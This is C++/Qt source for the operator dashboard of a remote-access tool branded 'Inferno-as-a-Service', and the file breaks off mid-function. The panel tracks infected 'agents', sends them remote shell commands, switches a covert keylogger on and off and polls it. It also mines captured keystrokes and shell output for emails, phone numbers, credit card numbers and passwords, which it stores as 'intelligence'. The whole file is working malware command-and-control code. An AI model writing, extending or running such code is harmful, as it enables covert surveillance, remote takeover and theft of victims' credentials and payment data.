#include "../include/MainWindow.hpp"
#include "../include/DataStreamWidget.hpp"
#include "../include/CommandDialog.hpp"
#include "../include/Inferno_Database.hpp"
#include "../include/AgentCardDialog.hpp"
#include "../include/Analysis.hpp"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QFile>
#include <QStatusBar>
#include <QMenuBar>
#include <QSplitter>
#include <QDateTime>
#include <QRegularExpression>
#include <QLabel>
#include <QPushButton>
#include <QListWidget>
#include <QPlainTextEdit>
#include <QGuiApplication>
#include <QClipboard>
#include <QHeaderView>

namespace {
    constexpr int kMaxHistoryLines = 50000;
}

namespace inferno {

MainWindow::MainWindow(Server* server, QWidget* parent)
    : QMainWindow(parent), m_server(server) {
    
    connect(m_server, &Server::agentConnected, this, &MainWindow::onAgentConnected);
    connect(m_server, &Server::agentDisconnected, this, &MainWindow::onAgentDisconnected);
    connect(m_server, &Server::shellOutputReceived, this, &MainWindow::onShellOutputReceived);
    connect(m_server, &Server::processListReceived, this, &MainWindow::onProcessListReceived);
    connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
    connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);

    // Animation Init
    m_radarAngle = 0;
    m_radarTimer = new QTimer(this);
    connect(m_radarTimer, &QTimer::timeout, this, &MainWindow::updateRadarAnimation);

    m_keylogPollTimer = new QTimer(this);
    m_keylogPollTimer->setInterval(1500);
    connect(m_keylogPollTimer, &QTimer::timeout, this, &MainWindow::pollKeylogger);

    m_searchDebounceTimer = new QTimer(this);
    m_searchDebounceTimer->setSingleShot(true);
    m_searchDebounceTimer->setInterval(200);
    connect(m_searchDebounceTimer, &QTimer::timeout, this, [this](){
        highlightSearchMatches(m_searchBox->text());
    });

    setupUI();
    loadStyleSheet();
}

void MainWindow::setupUI() {
    setWindowTitle("Inferno-as-a-Service | Operator Dashboard");
    setMinimumSize(1200, 800);

    // Initialize Core Widgets First to avoid Segfaults in connects
    m_telemetryConsole = new QPlainTextEdit();
    m_telemetryConsole->setReadOnly(true);
    m_keylogStream = new QPlainTextEdit();
    m_keylogStream->setReadOnly(true);
    m_agentList = new QListWidget();
    m_statusLabel = new QLabel(" SYSTEM READY");

    // Central Widget and Main Layout
    auto* centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);
    auto* mainLayout = new QVBoxLayout(centralWidget);
    mainLayout->setContentsMargins(0, 0, 0, 0);
    mainLayout->setSpacing(0);

    // 1. Header Toolbar
    auto* toolbar = addToolBar("Main Controls");
    toolbar->setMovable(false);
    
    auto* titleLabel = new QLabel(" INFERNO-AS-A-SERVICE ");
    titleLabel->setStyleSheet("font-size: 18px; font-weight: bold; color: #00ff41;");
    toolbar->addWidget(titleLabel);

    // Add Spacer to push branding to the right
    auto* spacer = new QWidget();
    spacer->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
    toolbar->addWidget(spacer);

    // Add Branding Skull (Increased Size)
    auto* brandingLabel = new QLabel();
    QPixmap skull(":/branding_skull.png");
    brandingLabel->setPixmap(skull.scaled(80, 80, Qt::KeepAspectRatio, Qt::SmoothTransformation));
    brandingLabel->setContentsMargins(0, 5, 20, 5);
    toolbar->addWidget(brandingLabel);

    // 2. Main Layout Splitter (Sidebar vs Tabs)
    auto* mainSplitter = new QSplitter(Qt::Horizontal, centralWidget);
    
    // Pane A: Agent Sidebar
    auto* agentContainer = new QWidget();
    auto* agentLayout = new QVBoxLayout(agentContainer);
    auto* agentHeader = new QHBoxLayout();
    agentHeader->addWidget(new QLabel("CONNECTED AGENTS"));
    agentHeader->addStretch();
    m_btnScan = new QPushButton();
    m_btnScan->setObjectName("iconButton");
    m_btnScan->setFixedSize(40, 40);
    m_btnScan->setIcon(QIcon(":/icon_scan.png"));
    m_btnScan->setIconSize(QSize(32, 32));
    m_btnScan->setToolTip("Scan Network");
    connect(m_btnScan, &QPushButton::clicked, this, &MainWindow::toggleScan);
    agentHeader->addWidget(m_btnScan);
    agentLayout->addLayout(agentHeader);
    
    m_agentList->setIconSize(QSize(36, 36)); // Increased Icon Size
    m_agentList->setStyleSheet(
        "QListWidget { background: #000; border: none; font-size: 14px; color: #00ff41; outline: none; }"
        "QListWidget::item { padding: 12px; margin: 2px; border-bottom: 1px solid #111; }"
        "QListWidget::item:selected { background: #0a0a0a; border: 2px solid #00ff41; color: #fff; border-radius: 4px; }"
        "QListWidget::item:hover { background: #111; }"
        "QScrollBar:vertical { background: #000; width: 10px; margin: 0px; }"
        "QScrollBar::handle:vertical { background: #1a1a1a; min-height: 20px; border-radius: 5px; }"
        "QScrollBar::handle:vertical:hover { background: #00ff41; }"
        "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }"
    );
    m_agentList->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff); // Kill the ghost boxes
    m_agentList->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(m_agentList, &QListWidget::customContextMenuRequested, this, &MainWindow::showAgentContextMenu);
    connect(m_agentList, &QListWidget::itemDoubleClicked, this, [this](QListWidgetItem* item){
        QString agentIp = item->data(Qt::UserRole).toString();
        QString uuid = m_agentIpToUuid.value(agentIp);
        
        AgentProfile profile = Inferno_Database::instance().getAgentProfile(uuid);
        AgentCardDialog dlg(profile, this);
        dlg.exec();
    });
    connect(m_agentList, &QListWidget::itemSelectionChanged, this, [this](){
        loadTelemetryHistory();
        loadKeylogHistory();
        loadIntelligenceList();
    });
    agentLayout->addWidget(m_agentList);
    mainSplitter->addWidget(agentContainer);

    // Right Pane: Tab Widget
    m_tabWidget = new QTabWidget(centralWidget);
    m_tabWidget->setStyleSheet(
        "QTabWidget::pane { border: 1px solid #1a1a1a; background: #000; }"
        "QTabBar::tab { background: #0c0c0c; color: #666; border: 1px solid #1a1a1a; padding: 10px 20px; font-weight: bold; font-size: 13px; }"
        "QTabBar::tab:selected { background: #000; color: #00ff41; border-bottom: 2px solid #00ff41; }"
        "QTabBar::tab:hover { background: #111; color: #fff; }"
    );

    // Tab 1: Control Center (Splitter for Telemetry & Keylogs)
    auto* controlWidget = new QWidget();
    auto* controlLayout = new QVBoxLayout(controlWidget);
    controlLayout->setContentsMargins(0, 0, 0, 0);

    // Pane B: Telemetry Console
    auto* telemetryContainer = new QWidget();
    auto* telemetryLayout = new QVBoxLayout(telemetryContainer);
    auto* telemetryHeader = new QHBoxLayout();
    telemetryHeader->addWidget(new QLabel("TELEMETRY CONSOLE"));
    telemetryHeader->addStretch();
    
    auto* btnShell = new QPushButton();
    btnShell->setObjectName("iconButton");
    btnShell->setFixedSize(40, 40);
    btnShell->setIcon(QIcon(":/icon_shell.png"));
    btnShell->setIconSize(QSize(32, 32));
    btnShell->setToolTip("Execute Shell");
    connect(btnShell, &QPushButton::clicked, this, &MainWindow::executeShellCommand);
    
    auto* btnProcs = new QPushButton();
    btnProcs->setObjectName("iconButton");
    btnProcs->setFixedSize(40, 40);
    btnProcs->setIcon(QIcon(":/icon_refresh.png"));
    btnProcs->setIconSize(QSize(32, 32));
    btnProcs->setToolTip("Refresh Process List");
    connect(btnProcs, &QPushButton::clicked, this, &MainWindow::requestProcessList);

    auto* btnClearConsole = new QPushButton();
    btnClearConsole->setObjectName("iconButton");
    btnClearConsole->setFixedSize(40, 40);
    btnClearConsole->setIcon(QIcon(":/icon_clear.png"));
    btnClearConsole->setIconSize(QSize(32, 32));
    btnClearConsole->setToolTip("Clear Console");
    connect(btnClearConsole, &QPushButton::clicked, this, [this](){
        m_telemetryConsole->clear();
        m_telemetryHistory.clear();
        m_statusLabel->setText(" Telemetry buffer cleared");
    });

    auto* btnHistory = new QPushButton();
    btnHistory->setObjectName("iconButton");
    btnHistory->setFixedSize(40, 40);
    btnHistory->setIcon(QIcon(":/icon_history.png"));
    btnHistory->setIconSize(QSize(32, 32));
    btnHistory->setToolTip("Load Telemetry History");
    connect(btnHistory, &QPushButton::clicked, this, &MainWindow::loadTelemetryHistory);

    m_typeFilter = new QComboBox();
    m_typeFilter->addItem("All History", "ALL");
    m_typeFilter->addItem("Shell only", "SHELL");
    m_typeFilter->addItem("Processes only", "PROC");
    m_typeFilter->setStyleSheet("background: #000; color: #00ff41; border: 1px solid #1a1a1a; padding: 2px;");
    connect(m_typeFilter, QOverload<int>::of(&QComboBox::currentIndexChanged), this, &MainWindow::loadTelemetryHistory);

    telemetryHeader->addWidget(btnShell);
    telemetryHeader->addWidget(btnProcs);
    telemetryHeader->addWidget(btnHistory);
    telemetryHeader->addWidget(m_typeFilter);
    telemetryHeader->addWidget(btnClearConsole);
    telemetryLayout->addLayout(telemetryHeader);
    
    // Console Search Bar
    auto* searchLayout = new QHBoxLayout();
    m_searchBox = new QLineEdit();
    m_searchBox->setPlaceholderText("Search telemetry...");
    m_searchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
    
    auto* btnSearch = new QPushButton();
    btnSearch->setFixedSize(40, 40);
    btnSearch->setIcon(QIcon(":/icon_search.png"));
    btnSearch->setIconSize(QSize(32, 32));
    btnSearch->setObjectName("iconButton");
    connect(btnSearch, &QPushButton::clicked, this, [this](){
        highlightSearchMatches(m_searchBox->text());
    });
    connect(m_searchBox, &QLineEdit::textChanged, m_searchDebounceTimer, QOverload<>::of(&QTimer::start));
    
    searchLayout->addWidget(m_searchBox);
    searchLayout->addWidget(btnSearch);
    telemetryLayout->addLayout(searchLayout);
    
    m_telemetryConsole->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(m_telemetryConsole, &QPlainTextEdit::customContextMenuRequested, this, [this](const QPoint& pos){
        QMenu menu(this);
        menu.addAction("Copy Selected", m_telemetryConsole, &QPlainTextEdit::copy);
        menu.exec(m_telemetryConsole->mapToGlobal(pos));
    });
    telemetryLayout->addWidget(m_telemetryConsole);

    // Pane C: Keystroke Stream
    auto* keylogContainer = new QWidget();
    auto* keylogLayout = new QVBoxLayout(keylogContainer);
    auto* keylogHeader = new QHBoxLayout();
    keylogHeader->addWidget(new QLabel("KEYSTROKE STREAM"));
    keylogHeader->addStretch();
    
    m_btnKeylog = new QPushButton();
    m_btnKeylog->setObjectName("iconButton");
    m_btnKeylog->setFixedSize(40, 40);
    m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
    m_btnKeylog->setIconSize(QSize(32, 32));
    m_btnKeylog->setCheckable(true);
    m_btnKeylog->setToolTip("Toggle Keylogger");
    connect(m_btnKeylog, &QPushButton::toggled, this, &MainWindow::toggleKeylogState);
    keylogHeader->addWidget(m_btnKeylog);
    keylogLayout->addLayout(keylogHeader);

    // Keylog Search & History Toolbar
    auto* keylogToolLayout = new QHBoxLayout();
    m_keylogSearchBox = new QLineEdit();
    m_keylogSearchBox->setPlaceholderText("Filter keystrokes...");
    m_keylogSearchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
    connect(m_keylogSearchBox, &QLineEdit::textChanged, this, &MainWindow::filterKeylogStream);

    auto* btnKeylogHistory = new QPushButton();
    btnKeylogHistory->setObjectName("iconButton");
    btnKeylogHistory->setFixedSize(40, 40);
    btnKeylogHistory->setIcon(QIcon(":/icon_history.png"));
    btnKeylogHistory->setIconSize(QSize(32, 32));
    btnKeylogHistory->setToolTip("Load Keylog History");
    connect(btnKeylogHistory, &QPushButton::clicked, this, &MainWindow::loadKeylogHistory);

    keylogToolLayout->addWidget(m_keylogSearchBox);
    keylogToolLayout->addWidget(btnKeylogHistory);
    keylogLayout->addLayout(keylogToolLayout);

    keylogLayout->addWidget(m_keylogStream);

    auto* controlSplitter = new QSplitter(Qt::Horizontal, controlWidget);
    controlSplitter->addWidget(telemetryContainer);
    controlSplitter->addWidget(keylogContainer);
    controlSplitter->setStretchFactor(0, 3);
    controlSplitter->setStretchFactor(1, 2);
    
    controlLayout->addWidget(controlSplitter);
    m_tabWidget->addTab(controlWidget, "Surveillance & Controls");

    // Tab 2: Intelligence & Analysis (Circle 6)
    auto* intelWidget = new QWidget();
    auto* intelLayout = new QVBoxLayout(intelWidget);
    intelLayout->setContentsMargins(10, 10, 10, 10);

    auto* intelHeader = new QHBoxLayout();
    intelHeader->addWidget(new QLabel("CLASSIFIED FORENSIC INTELLIGENCE"));
    intelHeader->addStretch();

    auto* btnScanHistory = new QPushButton("Force Scan History");
    btnScanHistory->setStyleSheet(
        "QPushButton { background: #0c0c0c; border: 1px solid #00ff41; color: #00ff41; padding: 6px 12px; font-weight: bold; border-radius: 3px; }"
        "QPushButton:hover { background: #00ff41; color: #000; }"
    );
    connect(btnScanHistory, &QPushButton::clicked, this, &MainWindow::forceScanHistory);
    intelHeader->addWidget(btnScanHistory);

    auto* btnCopyIntel = new QPushButton("Copy Finding");
    btnCopyIntel->setStyleSheet(
        "QPushButton { background: #0c0c0c; border: 1px solid #00ff41; color: #00ff41; padding: 6px 12px; font-weight: bold; border-radius: 3px; }"
        "QPushButton:hover { background: #00ff41; color: #000; }"
    );
    connect(btnCopyIntel, &QPushButton::clicked, this, &MainWindow::copySelectedIntel);
    intelHeader->addWidget(btnCopyIntel);

    auto* btnClearIntel = new QPushButton("Clear Findings");
    btnClearIntel->setStyleSheet(
        "QPushButton { background: #0c0c0c; border: 1px solid #ff0000; color: #ff0000; padding: 6px 12px; font-weight: bold; border-radius: 3px; }"
        "QPushButton:hover { background: #ff0000; color: #000; }"
    );
    connect(btnClearIntel, &QPushButton::clicked, this, &MainWindow::clearIntelFindings);
    intelHeader->addWidget(btnClearIntel);

    intelLayout->addLayout(intelHeader);

    auto* intelFiltersRow = new QHBoxLayout();
    m_intelSearchBox = new QLineEdit();
    m_intelSearchBox->setPlaceholderText("Filter findings...");
    m_intelSearchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
    connect(m_intelSearchBox, &QLineEdit::textChanged, this, &MainWindow::loadIntelligenceList);
    intelFiltersRow->addWidget(m_intelSearchBox);

    m_intelTypeFilter = new QComboBox();
    m_intelTypeFilter->addItem("All Findings", "ALL");
    m_intelTypeFilter->addItem("Emails", "EMAIL");
    m_intelTypeFilter->addItem("Phone Numbers", "PHONE");
    m_intelTypeFilter->addItem("Credit Cards", "CREDIT_CARD");
    m_intelTypeFilter->addItem("Passwords", "PASSWORD");
    m_intelTypeFilter->setStyleSheet("background: #000; color: #00ff41; border: 1px solid #1a1a1a; padding: 5px;");
    connect(m_intelTypeFilter, QOverload<int>::of(&QComboBox::currentIndexChanged), this, &MainWindow::loadIntelligenceList);
    intelFiltersRow->addWidget(m_intelTypeFilter);

    intelLayout->addLayout(intelFiltersRow);

    m_intelTable = new QTableWidget(0, 4, intelWidget);
    m_intelTable->setHorizontalHeaderLabels({"TYPE", "VALUE", "CONTEXT", "TIMESTAMP"});
    m_intelTable->setStyleSheet(
        "QTableWidget { background: #000; border: 1px solid #1a1a1a; color: #00ff41; gridline-color: #111; font-size: 13px; }"
        "QTableWidget::item { padding: 8px; }"
        "QTableWidget::item:selected { background: #00ff41; color: #000; }"
        "QHeaderView::section { background: #0c0c0c; color: #888; border: 1px solid #1a1a1a; padding: 6px; font-weight: bold; }"
    );
    m_intelTable->horizontalHeader()->setStretchLastSection(true);
    m_intelTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
    m_intelTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    m_intelTable->setSelectionMode(QAbstractItemView::SingleSelection);
    m_intelTable->setEditTriggers(QAbstractItemView::NoEditTriggers);
    intelLayout->addWidget(m_intelTable);

    m_tabWidget->addTab(intelWidget, "Intelligence Analysis");

    mainSplitter->addWidget(m_tabWidget);
    mainSplitter->setStretchFactor(0, 1);
    mainSplitter->setStretchFactor(1, 4);

    mainLayout->addWidget(mainSplitter);

    // 4. Data Stream Footer (Circle 4 Aesthetic)
    auto* dataStream = new DataStreamWidget(this);
    mainLayout->addWidget(dataStream);

    // 5. Status Bar
    m_statusLabel = new QLabel(" Ready");
    statusBar()->addWidget(m_statusLabel);
}

void MainWindow::loadStyleSheet() {
    QFile file(":/styles.qss");
    if (file.open(QFile::ReadOnly)) {
        QString styleSheet = QLatin1String(file.readAll());
        setStyleSheet(styleSheet);
    }
}

// Slots implementation
void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
    qDebug() << "[MainWindow] Agent connected from" << ip << "with info:" << info;
    // Parse UUID (Circle 5 Fingerprinting)
    static const QRegularExpression uuidRegex("ID: ([^| ]+)");
    auto match = uuidRegex.match(info);
    QString uuid = match.hasMatch() ? match.captured(1) : "UNKNOWN_UUID";
    qDebug() << "[MainWindow] Extracted UUID:" << uuid;
    m_agentIpToUuid[ip] = uuid; // Map volatile IP to persistent UUID
    
    // Circle 5 Phase II: Update SQL Liveness
    Inferno_Database::instance().setAgentOnlineStatus(uuid, true);

    // Register in Database
    QString hostname = "Unknown", osInfo = "Unknown";
    auto parts = info.split('|');
    for (const QString& part : parts) {
        if (part.contains("Host:")) hostname = part.section(':', 1).trimmed();
        if (part.contains("OS:")) osInfo = part.section(':', 1).trimmed();
    }
    Inferno_Database::instance().registerAgent(uuid, ip, hostname, osInfo);

    QString displayInfo = QString("%1 (%2)").arg(ip, hostname);
    
    // Check if agent already in list (from a previous session)
    QListWidgetItem* item = nullptr;
    for (int i = 0; i < m_agentList->count(); ++i) {
        if (m_agentList->item(i)->data(Qt::UserRole).toString() == uuid) {
            item = m_agentList->item(i);
            break;
        }
    }

    if (!item) {
        item = new QListWidgetItem("🟢 " + displayInfo, m_agentList);
        item->setData(Qt::UserRole, ip); // STORE VOLATILE IP HERE
    } else {
        item->setText("🟢 " + displayInfo);
    }
    
    QString lowerInfo = info.toLower();
    if (lowerInfo.contains("windows")) {
        item->setIcon(QIcon(":/os_win.png"));
    } else if (lowerInfo.contains("linux")) {
        item->setIcon(QIcon(":/os_linux.png"));
    } else if (lowerInfo.contains("macos") || lowerInfo.contains("darwin") || lowerInfo.contains("apple")) {
        item->setIcon(QIcon(":/os_mac.png"));
    }
    
    appendToTelemetry(QString("[SYSTEM] New connection established from %1").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
}

void MainWindow::onAgentDisconnected(const QString& ip) {
    QString uuid = m_agentIpToUuid.value(ip);
    Inferno_Database::instance().setAgentOnlineStatus(uuid, false);

    for (int i = 0; i < m_agentList->count(); ++i) {
        if (m_agentList->item(i)->data(Qt::UserRole).toString() == ip) {
            QString currentText = m_agentList->item(i)->text();
            if (currentText.startsWith("🟢")) {
                m_agentList->item(i)->setText("🔴" + currentText.mid(2));
            }
            break;
        }
    }
    appendToTelemetry(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
}

void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    static const QRegularExpression lineSplitter(QStringLiteral("[\r\n]+"));
    QStringList lines = output.split(lineSplitter, Qt::SkipEmptyParts);
    
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) {
        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
    }

    for (const QString& line : lines) {
        QString trimmed = line.trimmed();
        if (trimmed.isEmpty()) continue;
        
        // Log to Database (Circle 5)
        Inferno_Database::instance().logTelemetry(uuid, "SHELL", trimmed);

        QString formatted = QString("[%1] [%2] %3").arg(timestamp, ip, trimmed);
        appendToTelemetry(formatted);

        // Circle 6 analysis pipeline
        std::string text = trimmed.toStdString();
        auto emails = Analysis::extractEmails(text);
        for (const auto& email : emails) {
            Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Shell Output: " + trimmed);
        }
        auto phones = Analysis::extractPhones(text);
        for (const auto& phone : phones) {
            Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Shell Output: " + trimmed);
        }
        auto cards = Analysis::extractCreditCards(text);
        for (const auto& card : cards) {
            Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Shell Output: " + trimmed);
        }
        auto passwords = Analysis::extractPasswords(text);
        for (const auto& pair : passwords) {
            Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
        }
    }

    if (m_agentList->currentItem() && m_agentList->currentItem()->data(Qt::UserRole).toString() == ip) {
        loadIntelligenceList();
    }
}

void MainWindow::onProcessListReceived(const QString& ip, const QString& output) {
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) {
        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
    }
    
    // Log to Database (Circle 5) with specific PROC type
    Inferno_Database::instance().logTelemetry(uuid, "PROC", output);

    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    QString formatted = QString("[%1] [%2] [PROCESS SNAPSHOT RECEIVED]").arg(timestamp, ip);
    appendToTelemetry(formatted);
    appendToTelemetry(output); // Append the actual list
}
void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
    if (data.trimmed().isEmpty()) return;
    
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) {
        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
    }

    // Log to Database (Circle 5)
    Inferno_Database::instance().logKeylog(uuid, data);

    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
    appendToKeylog(line);

    // Get the full reconstructed keylog session (chronological order)
    QString fullKeylog = Inferno_Database::instance().getRawKeylogsChronological(uuid);
    std::string cleanKeylog = Analysis::filterBackspaces(fullKeylog.toStdString());

    // Circle 6 analysis pipeline on the filtered session keylog
    auto emails = Analysis::extractEmails(cleanKeylog);
    for (const auto& email : emails) {
        Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Keylog Stream");
    }
    auto phones = Analysis::extractPhones(cleanKeylog);
    for (const auto& phone : phones) {
        Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Keylog Stream");
    }
    auto cards = Analysis::extractCreditCards(cleanKeylog);
    for (const auto& card : cards) {
        Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Keylog Stream");
    }
    auto passwords = Analysis::extractPasswords(cleanKeylog);
    for (const auto& pair : passwords) {
        Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
    }

    if (m_agentList->currentItem() && m_agentList->currentItem()->data(Qt::UserRole).toString() == ip) {
        loadIntelligenceList();
    }
}

void MainWindow::appendToTelemetry(const QString& text) {
    m_telemetryHistory.append(text);
    if (m_telemetryHistory.size() > kMaxHistoryLines) {
        m_telemetryHistory.removeFirst();
    }
    // Only append to UI if it matches current filter or filter is empty
    if (m_searchBox->text().isEmpty() || text.contains(m_searchBox->text(), Qt::CaseInsensitive)) {
        m_telemetryConsole->appendPlainText(text);
        if (!m_searchBox->text().isEmpty()) {
            applyVisualHighlighting();
        }
    }
}

void MainWindow::appendToKeylog(const QString& text) {
    m_keylogHistory.append(text);
    if (m_keylogHistory.size() > kMaxHistoryLines) {
        m_keylogHistory.removeFirst();
    }
    if (m_keylogSearchBox->text().isEmpty() || text.contains(m_keylogSearchBox->text(), Qt::CaseInsensitive)) {
        m_keylogStream->appendPlainText(text);
    }
}

void MainWindow::onStatusMessage(const QString& message) {
    appendToTelemetry(QString("[SERVER] %1").arg(message));
    m_statusLabel->setText(" " + message);
}

void MainWindow::toggleScan() {
    if (m_radarTimer->isActive()) {
        m_radarTimer->stop();
        // Reset rotation
        QPixmap pixmap(":/icon_scan.png");
        m_btnScan->setIcon(QIcon(pixmap));
    } else {
        m_radarTimer->start(50);
    }
}

void MainWindow::updateRadarAnimation() {
    m_radarAngle = (m_radarAngle + 10) % 360;
    QPixmap pixmap(":/icon_scan.png");
    QTransform tr;
    tr.rotate(m_radarAngle);
    m_btnScan->setIcon(QIcon(pixmap.transformed(tr, Qt::SmoothTransformation)));
}

void MainWindow::toggleKeylogState(bool active) {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->data(Qt::UserRole).toString();
    if (active) {
        m_btnKeylog->setIcon(QIcon(":/icon_eye_open.png"));
        m_server->toggleKeylogger(agentIp, true);
        m_keylogPollTimer->start(1500); // Polling every 1.5s
    } else {
        m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
        m_server->toggleKeylogger(agentIp, false);
        m_keylogPollTimer->stop();
    }
}

void MainWindow::pollKeylogger() {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->data(Qt::UserRole).toString();
    m_server->requestKeylogDump(agentIp);
}

void MainWindow::showAgentContextMenu(const QPoint& pos) {
    QListWidgetItem* item = m_agentList->itemAt(pos);
    if (!item) return;

    QMenu menu(this);
    menu.addAction("Execute Shell...", this, &MainWindow::executeShellCommand);
    menu.addAction("Refresh Processes", this, &MainWindow::requestProcessList);
    menu.addSeparator();
    menu.addAction("Disconnect Agent");
    
    menu.exec(m_agentList->mapToGlobal(pos));
}

void MainWindow::executeShellCommand() {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) {
        onStatusMessage("No agent selected for command");
        return;
    }

    QString agentIp = item->data(Qt::UserRole).toString();
    
    CommandDialog dlg(agentIp, this);
    if (dlg.exec() == QDialog::Accepted) {
        QString cmd = dlg.getCommand();
        if (!cmd.isEmpty()) {
            m_telemetryConsole->appendPlainText(QString("[LOCAL] Dispatching: %1").arg(cmd));
            m_server->sendShellCommand(agentIp, cmd);
        }
    }
}

void MainWindow::requestProcessList() {
     QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->data(Qt::UserRole).toString();
    m_telemetryConsole->appendPlainText(QString("[LOCAL] Requesting Process List from %1").arg(agentIp));
    m_server->requestProcessList(agentIp);
}

void MainWindow::highlightSearchMatches(const QString& text) {
    m_telemetryConsole->clear();
    for (const QString& line : m_telemetryHistory) {
        if (text.isEmpty() || line.contains(text, Qt::CaseInsensitive)) {
            m_telemetryConsole->appendPlainText(line);
        }
    }
    
    applyVisualHighlighting();
}

void MainWindow::applyVisualHighlighting() {
    QString text = m_searchBox->text();
    if (text.isEmpty()) {
        m_telemetryConsole->setExtraSelections({});
        return;
    }

    QList<QTextEdit::ExtraSelection> extraSelections;
    QTextDocument* doc = m_telemetryConsole->document();
    QTextCursor cursor(doc);
    
    while (!cursor.isNull()) {
        cursor = doc->find(text, cursor);
        if (!cursor.isNull()) {
            QTextEdit::ExtraSelection selection;
            selection.format.setBackground(QColor(0, 255, 65, 80));
            selection.format.setForeground(Qt::black);
            selection.cursor = cursor;
            extraSelections.append(selection);
        } else {
            break;
        }
    }
    m_telemetryConsole->setExtraSelections(extraSelections);
}

void MainWindow::filterKeylogStream(const QString& text) {
    m_keylogStream->clear();
    for (const QString& line : m_keylogHistory) {
        if (text.isEmpty() || line.contains(text, Qt::CaseInsensitive)) {
            m_keylogStream->appendPlainText(line);
        }
    }
}

void MainWindow::loadTelemetryHistory() {
    auto* current = m_agentList->currentItem();
    if (!current) return;
    QString ip = current->data(Qt::UserRole).toString();
    QString uuid = m_agentIpToUuid.value(ip);

    if (uuid.isEmpty()) {
        m_telemetryConsole->appendPlainText("[ERROR] Could not resolve UUID for agent: " + ip);
        return;
    }

    m_telemetryConsole->clear();
    QString filter = m_searchBox->text();
    QString type = m_typeFilter->currentData().toString();
    
    QStringList dbHistory = Inferno_Database::instance().getTelemetryHistory(uuid, type);
    for (const QString& line : dbHistory) {
        if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
            m_telemetryConsole->appendPlainText(line);
        }
    }
    m_telemetryConsole->appendPlainText("[SYSTEM] Database history dump complete.");
    m_statusLabel->setText(" Telemetry history reloaded from SQL");
}

void MainWindow::loadKeylogHistory() {
    auto* current = m_agentList->currentItem();
    if (!current) return;
    QString ip = current->data(Qt::UserRole).toString();
    QString uuid = m_agentIpToUuid.value(ip);

    m_keylogStream->clear();
    QString filter = m_keylogSearchBox->text();
    
    QStringList dbHistory = Inferno_Database::instance().getKeylogHistory(uuid);
    for (const QString& line : dbHistory) {
        if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
            m_keylogStream->appendPlainText(line);
        }
    }
    m_keylogStream->appendPlainText("[SYSTEM] Keylog database history dump complete.");
    m_statusLabel->setText(" Keylog history reloaded from SQL");
}

void MainWindow::loadIntelligenceList() {
    m_intelTable->setRowCount(0);
    
    auto* current = m_agentList->currentItem();
    if (!current) return;
    
    QString ip = current->data(Qt::UserRole).toString();
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) return;

    QString filterType = m_intelTypeFilter->currentData().toString();
    QString searchVal = m_intelSearchBox->text().trimmed();

    QList<IntelEntry> list = Inferno_Database::instance().getIntelligence(uuid, filterType);
    
    int row = 0;
    for (const auto& entry : list) {
        if (!searchVal.isEmpty() && 
            !entry.value.contains(searchVal, Qt::CaseInsensitive) && 
            !entry.context.contains(searchVal, Qt::CaseInsensitive)) {
            continue;
        }

        m_intelTable->insertRow(row);
        
        auto* itemType = new QTableWidgetItem(entry.dataType);
        auto* itemValue = new QTableWidgetItem(entry.value);
        auto* itemContext = new QTableWidgetItem(entry.context);
        auto* itemTime = new QTableWidgetItem(entry.timestamp);

        itemType->setForeground(QColor(0, 255, 65));
        itemValue->setForeground(Qt::white);
